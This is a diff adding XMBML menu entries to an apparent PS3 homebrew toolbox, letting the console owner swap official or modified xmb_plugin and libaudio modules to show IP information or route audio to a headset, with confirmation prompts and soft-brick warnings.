+				<Pair key="title"><>Remove all IP info from XMB, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy the official CEX xmb_plugin.sprx to dev_blind/vsh/module/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/ip_on_xmb/xmb_plugin_cex.sprx#/dev_blind/vsh/module/xmb_plugin.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="ip_cex" attr="ip_cex"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ip_default_dex_item">
+		<Attributes>
+			<Table key="ip_dex">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add all IP info from XMB, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy the official DEX xmb_plugin.sprx to dev_blind/vsh/module/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/ip_on_xmb/xmb_plugin_dex.sprx#/dev_blind/vsh/module/xmb_plugin.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="ip_dex" attr="ip_dex"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ip_lite1_item">
+		<Attributes>
+			<Table key="ip_dex_lite">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Add IP Adress and "Connected from", Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy the a modified DEX xmb_plugin.sprx to dev_blind/vsh/module/
+				
+				 Warning: Soft brick on HEN, CFW Only! </></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/ip_on_xmb/xmb_plugin_lite1.sprx#/dev_blind/vsh/module/xmb_plugin.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="ip_dex_lite" attr="ip_dex_lite"/>
+		</Items>
+	</View>
+
+	<View id="toggle_ip_lite2_item">
+		<Attributes>
+			<Table key="ip_dex_lite2">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Show Only IP Address on the XMB, Are you sure?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will copy a modified DEX xmb_plugin.sprx to dev_blind/vsh/module/
+				
+				 Warning: Soft brick on HEN, CFW Only! </></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/ip_on_xmb/xmb_plugin_lite2.sprx#/dev_blind/vsh/module/xmb_plugin.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="ip_dex_lite2" attr="ip_dex_lite2"/>
+		</Items>
+	</View>
+
+	<View id="toggle_headset_audio_items">
+		<Attributes>
+			<Table key="enable_headset_audio">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_headset_game_sound.png</></Pair>
+				<Pair key="title"><>Enable Headset Audio Patch</></Pair>
+				<Pair key="info"><>Pass ALL audio to blutooth/USB headset   </></Pair>
+			</Table>
+			<Table key="disable_headset_audio">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/toggle_headset_game_sound.png</></Pair>
+				<Pair key="title"><>Disable Headset Audio Patch</></Pair>
+				<Pair key="info"><>Revert to normal audio output   </></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query class="type:x-xmb/folder-pixmap" key="enable_headset_audio" attr="enable_headset_audio" src="#enable_headset_audio_item"/>
+			<Query class="type:x-xmb/folder-pixmap" key="disable_headset_audio" attr="disable_headset_audio" src="#disable_headset_audio_item"/>
+		</Items>
+	</View>
+
+	<View id="enable_headset_audio_item">
+		<Attributes>
+			<Table key="enable_headset_audio1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Enable Headset Audio Patch?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will install a patched libaudio.sprx to dev_flash/sys/external/
+				
+				 Warning: Soft brick on HEN, CFW Only! </></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/audio_patch/libaudio_patched.sprx#/dev_blind/sys/external/libaudio.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="enable_headset_audio1" attr="enable_headset_audio1"/>
+		</Items>
+	</View>
+
+	<View id="disable_headset_audio_item">
+		<Attributes>
+			<Table key="disable_headset_audio1">
+				<Pair key="icon"><>/dev_hdd0/game/ULTOOLBOX/USRDIR/icon/flash_warning.png</></Pair>
+				<Pair key="title"><>Disable Headset Audio Patch?</></Pair>
+				<Pair key="info"><>Press  to continue (Reboot Required), Press  to go back
+				
+				This will install the official libaudio.sprx to dev_flash/sys/external/</></Pair>
+				<Pair key="module_name"><>videodownloader_plugin</></Pair>
+				<Pair key="module_action"><>fcopy#/dev_hdd0/game/ULTOOLBOX/USRDIR/patches/audio_patch/libaudio_ofw.sprx#/dev_blind/sys/external/libaudio.sprx</></Pair>
+				<Pair key="bar_action"><>none</></Pair>
+				<Pair key="lbl_half"><>1</></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Item class="type:x-xmb/module-action" key="disable_headset_audio1" attr="disable_headset_audio1"/>
+		</Items>
+	</View>
+</XMBML>
